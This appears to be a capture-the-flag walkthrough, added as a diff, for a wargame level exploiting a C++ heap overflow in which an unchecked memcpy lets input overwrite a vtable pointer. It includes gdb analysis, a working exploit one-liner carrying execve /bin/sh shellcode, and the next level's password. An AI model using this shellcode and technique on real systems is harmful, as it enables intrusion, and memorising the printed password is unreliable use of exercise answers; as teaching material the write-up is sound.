@@ -1,0 +1,77 @@
+# Level9 - Heap Overflow with Shellcode (C++)
+
+---
+
+# Walkthrough
+
+## Step 1: Test the program
+
+```bash
+./level9
+# (nothing)
+
+./level9 hello
+# (nothing)
+```
+
+Program takes one argument, shows nothing.
+
+## Step 2: Analyze functions
+
+```bash
+gdb level9
+(gdb) info functions
+```
+
+Found (C++ program):
+- `N::N(int)` → Constructor
+- `N::setAnnotation(char*)` → Copies data
+- `memcpy` → Memory copy (potential overflow)
+
+## Step 3: Analyze setAnnotation
+
+```bash
+(gdb) disas 'N::setAnnotation'
+```
+
+```c
+memcpy(this+4, input, strlen(input));  // No size limit!
+```
+
+**Vulnerability:** `memcpy` copies without checking size.
+
+## Step 4: Analyze main
+
+```bash
+(gdb) disas main
+```
+
+Key operations:
+1. `new(108)` → Creates object 1 on heap
+2. `new(108)` → Creates object 2 on heap
+3. `setAnnotation(argv[1])` → Copies input to object 1
+4. `call *%edx` → Calls function via vtable pointer
+
+## Step 5: Find the offset
+
+```bash
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2
+```
+
+**Result:** Crash after **108 bytes**.
+
+## Step 6: Build the exploit
+
+```bash
+./level9 $(python -c "print '\x10\xa0\x04\x08' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A'*83 + '\x0c\xa0\x04\x08'")
+```
+
+## Step 7: Get the flag
+
+```bash
+cat /home/user/bonus0/.pass
+```
+
+**Password:** `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
+
+---
